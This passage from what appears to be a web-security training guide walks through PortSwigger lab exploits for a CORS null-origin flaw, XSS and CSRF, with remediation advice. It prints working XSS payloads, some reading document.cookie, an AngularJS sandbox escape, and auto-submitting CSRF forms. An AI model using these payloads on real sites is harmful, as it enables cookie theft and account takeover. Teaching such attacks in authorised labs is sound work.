When the victim visits the exploit page, the iframe sends an authenticated request to /accountDetails with Origin: null. The vulnerable CORS policy permits the response to be read inside the sandbox.

docs.title: Step 5: Inspect the access log
docs.text:
After delivering the exploit, open the exploit server's access log. The fifth screenshot shows the captured response URL-encoded inside the key parameter.

Figure 5. The access log receives the victim's response. The JSON is percent-encoded because it was placed in the query string.

Find the request containing /log?key=.... Copy the encoded value after key= without losing any characters.

docs.title: Step 6: Decode the captured response
docs.text:
Paste the encoded value into a URL decoder. The sixth screenshot shows the decoded JSON response, including the administrator username and API key.

Figure 6. The decoded response reveals the administrator object and its API key. Submit only the API key through the lab's **Submit solution** control.

docs.title: What happened in the lab?
docs.text:
The attack succeeds because the application trusts an origin that an attacker can create with a sandboxed iframe:

  1. The victim logs in to the lab and receives an authenticated session.
  2. The victim opens the attacker-controlled exploit page.
  3. The exploit creates a sandboxed iframe with a null origin.
  4. The iframe requests /accountDetails with the victim's credentials.
  5. The server accepts null as an allowed origin and exposes the credentialed response.
  6. The iframe passes the response to the parent document with postMessage.
  7. The parent forwards the response to the exploit server's log.
  8. The encoded response is decoded and the administrator's API key is submitted.

docs.title: Common mistakes
docs.text:
• Using the hostname from an expired lab instance.
  • Adding allow-same-origin to the sandbox, which removes the null-origin behavior needed for this lab.
  • Forgetting req.withCredentials = true.
  • Forgetting to append the iframe to the document body.
  • Delivering the exploit before storing it on the exploit server.
  • Copying the full /log?key= prefix instead of only decoding its value.
  • Submitting the user's API key instead of the administrator's API key.

docs.title: Key takeaway
docs.text: null is not automatically safe. A server that trusts Origin: null and allows credentials can expose authenticated data to sandboxed attacker-controlled content. CORS allowlists should contain only deliberate, validated origins and should not blindly trust special or opaque origins.

docs.title: Cross-Site Scripting (XSS)
docs.text:
Cross-Site Scripting is a vulnerability where an application takes data that an attacker controls and places it into a page in a way that lets the browser run it as code instead of treating it as text. When that happens, the attacker's JavaScript executes in the victim's browser, inside the victim's session, with the same privileges as the legitimate page.

The whole bug comes down to one confusion: the browser cannot tell the difference between script the developer wrote and script an attacker injected. Both arrive in the same HTML response, so both run.

docs.title: Before XSS: a little JavaScript and HTML
docs.text: You do not need to be a JavaScript developer to find XSS, but a few basics make every payload make sense.

docs.title: HTML is parsed into a tree
docs.text: When the browser receives HTML, it builds the DOM (Document Object Model) — a tree of nodes representing every tag, attribute and piece of text. A <script> node in that tree is executed; a text node is not. XSS is almost always about getting your input parsed as a new node or attribute rather than as inert text.

docs.title: JavaScript runs in the page's origin
docs.text:
Script on a page can read and change anything the page can: the DOM, cookies that are not HttpOnly, localStorage, and any API the user is authenticated to. That is why running any JavaScript in a victim's session is serious — the payload inherits the victim's access.

document.cookie            // read non-HttpOnly cookies
localStorage.getItem('t')  // read stored tokens
fetch('/account')          // make authenticated requests as the victim

docs.title: Sources and sinks
docs.text:
Two terms describe how data moves through client-side code:

  • A source is where attacker-influenced data enters — location.search, location.hash, document.referrer, document.cookie, a postMessage event, or a value reflected by the server.
  • A sink is where that data is written in a way that can become code — innerHTML, document.write(), eval(), element.setAttribute('href', ...), jQuery's $(), and so on.
let name = new URLSearchParams(location.search).get('name'); // source
document.getElementById('out').innerHTML = name;             // sink → DOM XSS

If attacker-controlled data flows from a source to a dangerous sink without being encoded or sanitised, you have XSS.

docs.title: Context is everything
docs.text:
The same input is dangerous in some places and harmless in others. Where your value lands decides which payload works:

Context Example reflection Typical payload idea HTML body <p>HERE</p> <script>, <img onerror> HTML attribute <input value="HERE"> break out with "> then add an event handler JavaScript string var x = 'HERE'; break out with ' then write JS URL / href <a href="HERE"> javascript: URI

Finding XSS is mostly: reflect a unique marker, look at exactly where it appears in the response, then craft the payload for that specific context.

docs.title: Reflected XSS
docs.text:
The malicious input is included in the immediate response to the request that carried it. It is not stored. The attacker has to get the victim to send the crafted request — usually by clicking a link.

https://site/search?q=<script>alert(1)</script>

docs.title: Stored (persistent) XSS
docs.text: The input is saved by the application — in a comment, profile field, support ticket, log — and served to every user who views that content later. No special link is needed; the victim just visits a normal page. This is usually the most severe type because it can hit many users, including administrators.

docs.title: DOM-based XSS
docs.text:
The vulnerability is entirely in client-side JavaScript. The server may never see the payload. A script reads a source (often the URL) and writes it to a dangerous sink in the browser. Because the exploit can live in the URL fragment (#...), it is sometimes invisible to server logs.

Reflected vs DOM

Both can be delivered by a crafted URL. The difference is where the injection happens: reflected XSS is reflected by the server into the HTML; DOM XSS is written by JavaScript already on the page. View source vs. inspect the live DOM to tell them apart.

docs.title: Why it matters — impact
docs.text:
Running JavaScript as the victim lets an attacker:

  • Steal session cookies or tokens and hijack the account (when cookies are not HttpOnly).
  • Perform actions as the victim — change email, add a user, transfer funds — by calling the app's own endpoints.
  • Capture keystrokes and credentials from the page (fake login prompts, form hooks).
  • Pivot: stored XSS that an admin views can lead to admin-account takeover and, from there, the server.

docs.title: How to prevent it
docs.text:
1. Encode on output, for the right context. HTML-encode for HTML body, attribute-encode inside attributes, JavaScript-encode inside scripts. Encoding is context-specific — getting the context wrong leaves the bug open.
  2. Validate input where the format is known (an email, an integer), but never rely on input validation alone to stop XSS.
  3. Avoid dangerous sinks. Prefer textContent over innerHTML; never pass untrusted data to eval, document.write, or setTimeout(string).
  4. Content Security Policy (CSP) as defence in depth — a strong CSP can block inline script and untrusted origins so a payload that slips through still cannot run.
  5. Mark cookies HttpOnly so that, even if XSS fires, session cookies cannot be read from JavaScript.

docs.title: Labs in this section
docs.text:
These walkthroughs are performed against PortSwigger Web Security Academy labs in an authorised environment.

  • Reflected XSS into HTML context with nothing encoded
  • Stored XSS into HTML context with nothing encoded
  • DOM XSS in innerHTML sink using location.search
  • Reflected XSS into attribute with angle brackets HTML-encoded
  • Reflected XSS into a JavaScript string with angle brackets HTML-encoded
  • Stored XSS into anchor href attribute with double quotes HTML-encoded
  • DOM XSS in document.write sink using location.search
  • DOM XSS in jQuery anchor href attribute sink using location.search
  • DOM XSS in AngularJS expression with angle brackets HTML-encoded

docs.title: DOM XSS in AngularJS expression with angle brackets HTML-encoded
docs.text:
Lab: PortSwigger Web Security Academy — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded (Apprentice).

The lab contains a DOM-based XSS vulnerability in a AngularJS expression within the search functionality. The goal is to perform an XSS attack that executes an AngularJS expression and calls the alert function.

AngularJS scans any element marked with the ng-app directive and evaluates expressions inside double curly braces {{ ... }}. If user input is reflected inside such an element, you can inject an AngularJS expression instead of HTML — which is exactly what you need when angle brackets and quotes are encoded, because the expression needs neither.

docs.title: Why this is different
docs.text:
• The page uses AngularJS: an ng-app directive is present on a container that includes the reflected value.
  • Angle brackets (<, >) and double quotes are HTML-encoded, so classic tag or attribute injection is blocked.
  • But {{ and }} are not special to HTML, so they pass through — and AngularJS will evaluate whatever expression they contain. This is client-side template injection.

docs.title: The payload
docs.text:
Modern AngularJS has an expression sandbox, so a bare {{alert(1)}} is blocked. The standard escape reaches the native Function constructor via an object's constructor chain and builds a function that calls alert:

{{constructor.constructor('alert(1)')()}}
  • constructor.constructor resolves to the Function constructor.
  • Function('alert(1)') creates a new function whose body is alert(1).
  • The trailing () invokes it immediately.

docs.title: 1. Deliver the expression
docs.text:
Submit the payload through the search field, or place it directly in the URL:

/?search={{constructor.constructor('alert(1)')()}}

AngularJS evaluates the expression inside the ng-app scope and alert fires:

The lab is solved as soon as the expression executes.

docs.title: Why the attack works
docs.text:
AngularJS treats text inside {{ }} within an ng-app region as a template expression and evaluates it. HTML-encoding of angle brackets and quotes is irrelevant because the injection is an expression, not markup. Reaching constructor.constructor lets the payload break out of the AngularJS expression sandbox and call native JavaScript.

Client-side template injection

This is the client-side cousin of server-side template injection (SSTI). Any framework that interpolates user input into its own expression language — AngularJS, Vue, Handlebars-style templates — can be abused this way if raw input reaches a template context.

docs.title: Remediation
docs.text: Do not place untrusted input inside a region governed by a client-side template framework. Keep user data out of ng-app scopes, render it with bindings that treat it as text, and prefer modern Angular (2+), which does not evaluate {{ }} expressions from arbitrary interpolated strings the way AngularJS 1.x does.

docs.title: DOM XSS in document.write sink using location.search
docs.text:
Lab: PortSwigger Web Security Academy — DOM XSS in document.write sink using source location.search (Apprentice).

The lab contains a DOM-based XSS vulnerability in the search query tracking functionality. It uses document.write, which writes data to the page. The document.write function is called with data from location.search, which can be controlled via the website URL. The goal is to call the alert function.

document.write() writes a string straight into the HTML stream as the page parses, so whatever markup it receives becomes part of the document. This is a classic source → sink DOM flow with the server never seeing the payload in a meaningful way.

docs.title: Source and sink
docs.text:
• Source — location.search, the URL query string, fully attacker-controlled.
  • Sink — document.write(), which parses its argument as HTML.

The vulnerable client-side code builds an <img> tag from the search term and writes it:

function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    trackSearch(query);   // location.search -> document.write sink
}

Your value lands inside the src="..." attribute of that image.

docs.title: 1. Visit the page
docs.text: Open the lab and use the blog search. The term is reflected into the tracker image's src by document.write.

docs.title: 2. Break out of the src attribute
docs.text:
Close the src attribute and the <img> tag with ">, then inject your own element. Because this sink parses fresh HTML, a straightforward tag works:

"><script>alert(1)</script>

A <svg onload=alert(1)> payload is an equally reliable alternative.

docs.title: 3. The sink executes
docs.text:
document.write emits:

<img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>">

The browser parses the new <script> node as the document streams and alert runs:

docs.title: Why the attack works
docs.text:
document.write injects its argument into the page as it is being parsed, so attacker markup becomes live document structure. The value came from location.search and was concatenated into HTML with no encoding — a textbook unsafe source-to-sink flow.

document.write vs innerHTML

Unlike innerHTML, markup written by document.write during initial parsing can run a plain <script> tag, because it is injected into the live parser stream rather than assigned to an already-parsed element.

docs.title: Remediation
docs.text: Avoid document.write with untrusted data. Build the URL safely (e.g. set img.src via the DOM API with an encoded parameter) or use encodeURIComponent() on the value before placing it in a URL. Treat every URL-derived value as attacker-controlled.

docs.title: DOM XSS in innerHTML sink using location.search
docs.text:
Lab: PortSwigger Web Security Academy — DOM XSS in innerHTML sink using source location.search (Apprentice).

The lab has a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment that changes the HTML contents of a div using data from location.search. The goal is to call the alert function.

This lab is a clean example of a source → sink flow happening entirely in the browser. The server is not involved in the injection; the page's own JavaScript is.

docs.title: Source and sink in JavaScript
docs.text:
• Source — any place attacker-influenced data originates. Here it is location.search (the URL query string), which is fully user-controlled.
  • Sink — any place data is written in a way that can execute. Here it is innerHTML, which parses its input as HTML.

Common sources and sinks to recognise:

// sources (untrusted input)
location.search         // URL query string
location.hash           // URL fragment
document.cookie         // cookies
localStorage.getItem()  // browser storage

// sinks (dangerous if fed untrusted data)
element.innerHTML = x;  // parses HTML
document.write(x);      // writes markup
eval(x);                // executes JS

docs.title: The vulnerable code
docs.text:
The lab's client-side script reads the search parameter and assigns it straight into innerHTML:

function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;  // sink
}

var query = (new URLSearchParams(window.location.search)).get('search'); // source

if (query) {
    doSearchQuery(query);
}
/*
  location.search (source)
        ↓
  URLSearchParams.get('search')
        ↓
  doSearchQuery(query)
        ↓
  innerHTML (sink)
*/

The value is never validated or encoded, so whatever HTML is in the search parameter is parsed into the page.

docs.title: 1. Visit the page and locate the search field
docs.text: Open the lab and use the blog search. The term you type is written into the searchMessage element by the script above.

docs.title: 2. Choose a payload that fires without <script>
docs.text:
A plain <script> tag inserted via innerHTML does not execute — the HTML spec says script elements added this way do not run. So we use an element with an event handler that the browser fires on its own:

<img src=1 onerror=alert(1)>

The browser tries to load the image 1, fails, and runs the onerror handler.

docs.title: 3. Trigger the sink
docs.text: Submit the search (or load the URL with ?search=<img src=1 onerror=alert(1)>). The script copies the payload into innerHTML, the broken image fires onerror, and alert runs:

docs.title: Why the attack works
docs.text:
The page trusts a value it reads from the URL and writes it into an HTML-parsing sink. Because innerHTML interprets markup, an attacker-chosen element and event handler become live code — all without the server ever processing the payload.

Why not <script>?

When you assign a string containing <script> to innerHTML, the script node is created but not executed per the HTML standard. Event-handler payloads (onerror, onload, onmouseover) are the standard way around this for innerHTML sinks.

docs.title: Remediation
docs.text: Do not write untrusted data into innerHTML. Use textContent (which never parses HTML) for display, or sanitise with a trusted library before insertion. Treat every URL-derived value as attacker-controlled.

docs.title: DOM XSS in jQuery anchor href attribute sink using location.search
docs.text:
Lab: PortSwigger Web Security Academy — DOM XSS in jQuery anchor href attribute sink using location.search source (Apprentice).

The lab contains a DOM-based XSS vulnerability in the submit-feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search. The goal is to make the "back" link call alert(document.cookie).

jQuery's .attr('href', value) is a DOM sink when the value is attacker-controlled: writing a javascript: URI into an href makes the link execute code when it is activated.

docs.title: Source and sink
docs.text:
• Source — location.search, read via a returnPath (or similar) query parameter.
  • Sink — $(selector).attr('href', value), which sets the anchor's href.

The vulnerable code reads the parameter and assigns it to the "back" link:

$(function() {
    $('#backLink').attr('href', (new URLSearchParams(window.location.search)).get('returnPath'));
});

Whatever is in returnPath becomes the href of the back link.

docs.title: 1. Visit the feedback page
docs.text: Open the lab's Submit feedback page and note the Back link, whose href is driven by the returnPath parameter.

docs.title: 2. Put a javascript: URI in the parameter
docs.text:
Change the URL so returnPath is a javascript: URI that reads the cookie:

/feedback?returnPath=javascript:alert(document.cookie)

jQuery writes this straight into the link's href.

docs.title: 3. Click the back link
docs.text:
Activating the link navigates the javascript: URI and runs the payload:

The lab is solved once clicking Back triggers the alert.

docs.title: Why the attack works
docs.text: The application trusts a value from the URL and writes it into an href with no scheme validation. An href is a URL, and the javascript: scheme executes its body in the page's origin — so a crafted link turns a benign navigation control into a code-execution sink. jQuery's .attr() performs no sanitisation of its own.

docs.title: Remediation
docs.text: Never place untrusted data into an href without validating the URL scheme — allow only http:/https: (and relative paths). Avoid driving navigation targets from the query string; if you must, resolve them against an allowlist of known paths rather than reflecting the raw value.

docs.title: Reflected XSS into attribute with angle brackets HTML-encoded
docs.text:
Lab: PortSwigger Web Security Academy — Reflected XSS into HTML context with angle brackets HTML-encoded (Apprentice).

The lab has a reflected XSS vulnerability in the search blog functionality where angle brackets are HTML-encoded. The goal is to perform a cross-site scripting attack that injects an attribute and calls the alert function.

This lab introduces the idea that encoding is context-specific. The application encodes < and > (to < and >), so you cannot inject a new tag like <script>. But the value is reflected inside an existing HTML attribute, and the quote that delimits that attribute is not encoded — so you can still break out of the attribute value and add your own attributes.

docs.title: Where the value lands
docs.text:
The search term is reflected into an attribute, something like:

<input type="text" placeholder="Search the blog..." name="search" value="REFLECTED-HERE">

Because angle brackets are encoded, a <script> payload is rendered inert. The attribute context, however, is still fully controllable: a " closes the value attribute, after which anything you type becomes new markup attributes on the same <input> tag.

docs.title: 1. Find the reflection and confirm encoding
docs.text: Search for a unique marker and inspect the response. You will see your marker inside the value attribute, and if you try <test> you will see <test> — angle brackets are encoded.

docs.title: 2. Break out of the attribute
docs.text:
Since tags are blocked but the quote is not, close the value attribute with " and add an event-handler attribute. autofocus makes the browser move focus to the element automatically, which fires onfocus without any user interaction:

" autofocus onfocus=alert(document.domain) x="

The trailing x=" re-opens a dummy attribute so the surrounding quote in the original markup stays balanced.

docs.title: 3. The handler fires
docs.text:
The resulting element becomes:

<input ... value="" autofocus onfocus=alert(document.domain) x="">

The browser auto-focuses the input and runs the onfocus handler, so alert fires on page load:

docs.title: Why the attack works
docs.text:
Encoding angle brackets only stops new tags. The injection point is an attribute value, and the quote character that delimits it was left unencoded. With one " you escape the value and begin writing attributes of your own — and event handlers (onfocus, onmouseover, onclick) are JavaScript. autofocus turns a handler that normally needs interaction into one that runs by itself.

Match the quote

Check whether the attribute uses double or single quotes and break out with the same character. If the value is inside value='...', use ' instead of ".

docs.title: Remediation
docs.text: Encoding must be context-aware. Inside an HTML attribute, also encode the quote characters (" → ", ' → ') so the value cannot escape the attribute. Prefer frameworks that apply attribute-context encoding automatically, and validate input where a known format is expected.

docs.title: Reflected XSS into HTML context with nothing encoded
docs.text:
Lab: PortSwigger Web Security Academy — Reflected XSS into HTML context with nothing encoded (Apprentice).

The lab has a reflected cross-site scripting vulnerability in the search functionality. The goal is to perform an XSS attack that calls the alert function.

This is the canonical "hello world" of XSS: the search term is copied into the HTML response with no encoding at all, so a <script> tag in the query becomes a real script node in the page.

docs.title: 1. Find the reflection
docs.text:
Open the lab and use the search box with a harmless unique marker, for example xsstest123. The term appears in the response:

<h1>0 search results for 'xsstest123'</h1>

The marker is reflected directly into the HTML body context, between tags. Because nothing around it is encoded, anything you type is parsed as HTML.

docs.title: 2. Submit the payload
docs.text:
Search for a classic payload instead of plain text:

<script>alert(1)</script>

You can submit it in the search box, or put it straight in the URL:

https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>

docs.title: 3. The script executes
docs.text:
The server reflects the payload unencoded, the browser parses it as a <script> node, and alert(1) runs:

The lab is solved as soon as the alert fires.

docs.title: Why the attack works
docs.text: The application treats the search term as data but inserts it into the page as markup. With no HTML-encoding, <, > and / keep their structural meaning, so <script>…</script> opens a new executable node instead of printing the literal characters.

docs.title: Remediation
docs.text: HTML-encode the value on output so the browser renders it as text: < becomes <, > becomes >. In that case the page would display the literal string <script>alert(1)</script> and nothing would execute.

docs.title: Reflected XSS into a JavaScript string with angle brackets HTML-encoded
docs.text:
Lab: PortSwigger Web Security Academy — Reflected XSS into a JavaScript string with angle brackets HTML-encoded (Apprentice).

The lab contains a reflected XSS vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. The goal is to break out of the JavaScript string and call the alert function.

This is another "encoding is context-specific" lab, but here the value lands inside a <script> block, within a JavaScript string literal. Angle brackets are HTML-encoded, so you cannot open a new tag — but you do not need one. You are already inside script, so you only have to break out of the string and write JavaScript.

docs.title: Where the value lands
docs.text:
The page tracks the search term in an inline script:

<script>
    var searchTerms = 'REFLECTED-HERE';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

The injection point is between the single quotes of searchTerms. HTML-encoding < and > is irrelevant in this context because the browser is not parsing HTML here — the JavaScript interpreter is running.

docs.title: 1. Find the reflection
docs.text: Search for a unique marker and view source. The marker appears inside the single-quoted JavaScript string in the inline <script>.

docs.title: 2. Break out of the string
docs.text:
Close the string with ', call alert, then comment out the rest of the line so the remaining original code does not cause a syntax error:

'-alert(1)-'

An alternative that also works is terminating the statement and commenting out the remainder:

';alert(1)//

Using '-alert(1)-' keeps the expression syntactically valid (string minus number minus string), which avoids breakage from the surrounding code.

docs.title: 3. The script runs
docs.text:
The resulting line becomes:

var searchTerms = ''-alert(1)-'';

The interpreter evaluates the expression, alert(1) executes as the script runs, and the lab is solved — no user interaction needed.

docs.title: Why the attack works
docs.text: The value is placed into a JavaScript context, so the dangerous character is the string delimiter ('), not the angle bracket. HTML-encoding protects HTML contexts; it does nothing for a value embedded in a script. Once you terminate the string, everything after it is parsed as code.

docs.title: Remediation
docs.text: Use JavaScript-context escaping, not HTML-encoding, for values written into scripts — for example, serialise with JSON.stringify() or an equivalent that escapes quotes, backslashes and line terminators. Better still, avoid injecting request data into inline scripts at all; pass it through a data attribute or a safely-encoded JSON block and read it with textContent.

docs.title: Stored XSS into anchor href attribute with double quotes HTML-encoded
docs.text:
Lab: PortSwigger Web Security Academy — Stored XSS into anchor href attribute with double quotes HTML-encoded (Apprentice).

The lab contains a stored XSS vulnerability in the comment functionality. The goal is to submit a comment that calls the alert function when the comment author name is clicked.

Here the stored value (the comment author's website) is reflected inside an anchor's href, and double quotes are HTML-encoded (" → "). So you cannot break out of the attribute with a quote — but you do not need to. A href that begins with the javascript: scheme executes JavaScript when the link is clicked, and that lives entirely inside the attribute value.

docs.title: Where the value lands
docs.text:
The author name links to the website the commenter supplied:

<a href="REFLECTED-HERE">commenter name</a>

Quote-encoding blocks " breakout, but the javascript: URI scheme never needs to leave the attribute.

docs.title: 1. Find the comment form
docs.text: Open a blog post and scroll to Leave a comment. The Website field is the one reflected into the href of the author link.

docs.title: 2. Submit a javascript: URI as the website
docs.text:
Put the following in the Website field, and fill the other fields with any valid-looking values:

javascript:alert(1)

The stored link becomes:

<a href="javascript:alert(1)">commenter name</a>

docs.title: 3. Trigger it
docs.text:
Return to the post and click the comment author's name. The browser navigates the javascript: URI, which runs the code, and alert fires:

The lab is solved once the alert fires on click.

docs.title: Why the attack works
docs.text: The defence only encodes quotes, which stops attribute breakout — but it never validates the attribute's scheme. An href is a URL, and javascript: is a valid (dangerous) URL scheme that executes its body in the page's origin. Because the comment is stored, every visitor who clicks the link is affected.

docs.title: Remediation
docs.text: Validate URL schemes on output: allow only http:, https: (and perhaps mailto:), and reject or neutralise javascript:, data: and other active schemes. Combine this with context-aware attribute encoding, and apply the checks server-side so stored values cannot bypass them.

docs.title: Stored XSS into HTML context with nothing encoded
docs.text:
Lab: PortSwigger Web Security Academy — Stored XSS into HTML context with nothing encoded (Apprentice).

The lab has a stored cross-site scripting vulnerability in the comment functionality. The goal is to submit a comment that calls the alert function when the blog post is viewed.

Stored XSS differs from reflected XSS in one important way: the payload is saved by the application and then served to everyone who opens that page. No crafted link is needed — the victim just reads the blog post.

docs.title: 1. Open a blog post and find the comment form
docs.text: Open any post from the lab home page and scroll to Leave a comment. The comment is displayed back on the post once submitted, which is the sink we are targeting.

docs.title: 2. Submit a payload as the comment
docs.text:
Put a script payload in the Comment field and fill the other required fields with any valid-looking values:

<script>alert(document.cookie)</script>

Using document.cookie instead of a plain alert(1) makes the point explicit: the injected script can read the viewer's cookies in their session.

docs.title: 3. The stored payload runs on view
docs.text:
After posting, the application saves the comment and renders it unencoded inside the post. Every time the page is loaded, the browser parses the stored <script> node and executes it:

The lab is solved once the comment triggers alert on page load.

docs.title: Why the attack works
docs.text: The comment text is persisted and later written into the post's HTML with no output encoding. Because the value keeps its markup meaning, the saved <script> tag is treated as code for every visitor — this is what makes stored XSS higher-impact than reflected XSS.

docs.title: Remediation
docs.text: HTML-encode comment content on output so it renders as text, and validate/clean rich input server-side if formatting must be allowed. Marking session cookies HttpOnly additionally prevents document.cookie from returning them even if a payload runs.

docs.title: Cross-Site Request Forgery (CSRF)
docs.text:
Cross-Site Request Forgery is a vulnerability that lets an attacker make a victim's browser send a request the victim never intended — a request the application then treats as a deliberate action by the logged-in user. Because the browser automatically attaches the victim's session cookie to any request aimed at the application, the server cannot tell the forged request apart from a genuine one.

The whole bug is a confusion of intent: the application assumes that a correctly authenticated request is also an authorised, intended request. CSRF breaks that assumption by borrowing the victim's ambient authority (their cookies) while the victim is doing something else entirely — viewing an attacker's page.

docs.title: The three conditions CSRF needs
docs.text:
A CSRF attack is only possible when all three of these hold for the target action:

  1. A relevant action. There is something worth forging — changing an email address, changing a password, transferring funds, promoting an account. State-changing actions are the targets; read-only pages are not.
  2. Cookie-based session handling. The application identifies the user solely from session cookies that the browser sends automatically. If the action also needs a value the attacker cannot know (a token, a re-typed password), the attack becomes much harder.
  3. No unpredictable request parameters. Every parameter the request needs is known to, or guessable by, the attacker. A secret CSRF token is exactly the "unpredictable parameter" that normally blocks the attack.

CSRF vs XSS

They are often confused. XSS runs the attacker's script in the victim's browser; CSRF makes the browser send a request the attacker chose, without running any script on the target origin. CSRF is strictly less powerful — it can only perform actions the victim's session is allowed to perform, and (without a second bug) cannot read the response.

docs.title: How the attack works
docs.text:
Suppose the email-change endpoint accepts a plain form POST:

POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=attacker@evil.net

The only thing proving identity is the session cookie, and the browser attaches it to any request to that host. So the attacker hosts a page that auto-submits the same form from a different origin:

<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>

When a logged-in victim loads the page, their browser submits the form with their cookie attached, and the server changes their email.

docs.title: Delivery
docs.text:
• A page the attacker controls — the victim just has to visit it while authenticated.
  • A link sent by email, chat or social media that leads to that page.
  • Self-contained GET attacks — if the action accepts GET, no hosting is even needed:
<img src="https://vulnerable-website.com/email/change?email=attacker@evil.net">

Burp CSRF PoC generator

In Burp Suite Professional, right-click a captured request → Engagement tools → Generate CSRF PoC. It builds the HTML form (and the auto-submit script) for you, which you then paste into the exploit server. Most of the labs in this section use it.

docs.title: The main defences
docs.text:
• CSRF tokens. A unique, secret, unpredictable value the server generates and the client must return with each state-changing request. This is the strongest defence — the attacker cannot guess the token, so cannot forge a valid request.
  • SameSite cookies. A browser control over whether cookies ride along on cross-site requests (covered below).
  • Referer validation. The server checks that the Referer header points at its own domain. Weaker, because the header can be absent or manipulated.

docs.title: The SameSite cookie model
docs.text: SameSite is a cookie attribute that tells the browser when to include a cookie on requests triggered by another site. It is partial protection against CSRF (and cross-site leaks). Since 2021, Chrome treats a cookie with no explicit SameSite attribute as Lax by default.

docs.title: "Site" is not "origin"
docs.text:
This distinction is the key to several bypasses:

  • An origin is scheme + host + port — https://app.example.com exactly.
  • A site is the scheme plus the registrable domain (TLD+1) — so app.example.com, intranet.example.com and example.com are all the same site but different origins.

A request can therefore be cross-origin yet same-site, and SameSite cookies are sent on same-site requests.

docs.title: The three levels
docs.text:
Level Behaviour Strict The cookie is never sent on any cross-site request. Most secure, but breaks arriving at the site from external links while logged in. Lax (Chrome default) The cookie is sent cross-site only on a top-level navigation (the user clicking a link, changing the address bar) using a safe method (GET). It is not sent on cross-site POST, or on background requests from scripts, iframes, or images. None The cookie is sent on all cross-site requests. Must be paired with Secure. This effectively disables SameSite protection.

Default-Lax has a grace period

Chrome's default Lax (a cookie with no explicit SameSite) is not identical to an explicit SameSite=Lax. For the first 120 seconds after such a cookie is issued, top-level cross-site POST requests are still allowed, to avoid breaking SSO/OAuth logins. If an attacker can force a fresh cookie to be issued, that two-minute window reopens POST-based CSRF — see the cookie-refresh lab.

docs.title: Sibling domains and CSWSH
docs.text:
Because SameSite protects the site, not the origin, it provides no isolation between sibling domains. If bank.example.com sets SameSite=Strict cookies but support.example.com has an XSS or open-redirect flaw, an attacker who controls support.example.com can issue same-site requests to bank.example.com with the victim's cookies attached. The security of the whole site collapses to the security of its weakest subdomain.

The same reasoning extends to Cross-Site WebSocket Hijacking (CSWSH): a WebSocket handshake is an ordinary HTTP request that carries cookies. If the handshake has no CSRF protection, an attacker's page can open a wss:// connection to the target, the browser attaches the victim's cookies (subject to SameSite), and the attacker drives the socket as the victim.

docs.title: How to prevent it
docs.text:
1. Use CSRF tokens for every state-changing request, tie them to the user's session, and reject any request where the token is missing, wrong, or belongs to another session.
  2. Set SameSite=Lax or Strict explicitly on session cookies (do not rely on the browser default), and use SameSite=None; Secure only where cross-site delivery is genuinely required.
  3. Do not accept state-changing actions over GET, and do not honour framework method-override parameters (_method) on authenticated endpoints.
  4. Audit every sibling domain — one XSS on a subdomain defeats SameSite for the whole site.
  5. Validate the Origin/Referer header as defence in depth, never as the sole control.

docs.title: Labs in this section
docs.text:
These walkthroughs are performed against PortSwigger Web Security Academy labs in an authorised environment.

  • CSRF vulnerability with no defenses
  • CSRF where token validation depends on request method
  • CSRF where token validation depends on token being present
  • CSRF where token is not tied to user session
  • CSRF where token is tied to a non-session cookie
  • CSRF where token is duplicated in cookie (double submit)
  • SameSite Lax bypass via method override
  • SameSite Strict bypass via client-side redirect
  • SameSite Lax bypass via cookie refresh

docs.title: CSRF vulnerability with no defenses
docs.text:
Lab: PortSwigger Web Security Academy — CSRF vulnerability with no defenses (Apprentice).

The email-change functionality is vulnerable to CSRF. Craft HTML that uses a CSRF attack to change the viewer's email address, and host it on the exploit server. Credentials: wiener:peter.

This is the baseline case: the request has all three conditions for CSRF — a relevant action (changing the account email), cookie-only authentication, and no unpredictable parameter.

docs.title: 1. Log in and find the action
docs.text: Log in as wiener:peter and open the account page, which exposes an update email form.

docs.title: 2. Inspect the request
docs.text:
Submit a new email with Burp intercepting. The request is a plain form POST whose only identity proof is the session cookie — there is no CSRF token anywhere:

POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=...

email=test@test.com

docs.title: 3. Generate the CSRF PoC
docs.text:
Right-click the request → Engagement tools → Generate CSRF PoC. Burp produces a self-submitting HTML form:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@mail.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

docs.title: 4. Deliver it
docs.text:
Paste the PoC into the exploit server, store it, and Deliver exploit to victim. When the victim's browser loads the page it submits the form with their cookie attached, and their email is changed.

Use a fresh address in the final exploit

You cannot register an email already taken by another user. If you changed your own email while testing, put a different address in the exploit you deliver to the victim, or the attack will silently fail.

docs.title: Why the attack works
docs.text: Nothing distinguishes the forged request from a genuine one. The browser attaches the victim's session cookie automatically, and because there is no secret token the attacker can reproduce every other parameter. The server authenticates the request and assumes it was intended.

docs.title: Remediation
docs.text: Add a per-session CSRF token to the form and require it on the server for every state-changing request. Set the session cookie to SameSite=Lax so a cross-site POST would not carry it in the first place.

docs.title: SameSite Lax bypass via cookie refresh
docs.text:
Lab: PortSwigger Web Security Academy — SameSite Lax bypass via cookie refresh.

The change-email function is vulnerable to CSRF. Solve it using the exploit server. The lab supports OAuth login via "social media"; credentials: wiener:peter.

docs.title: The two behaviours this abuses
docs.text:
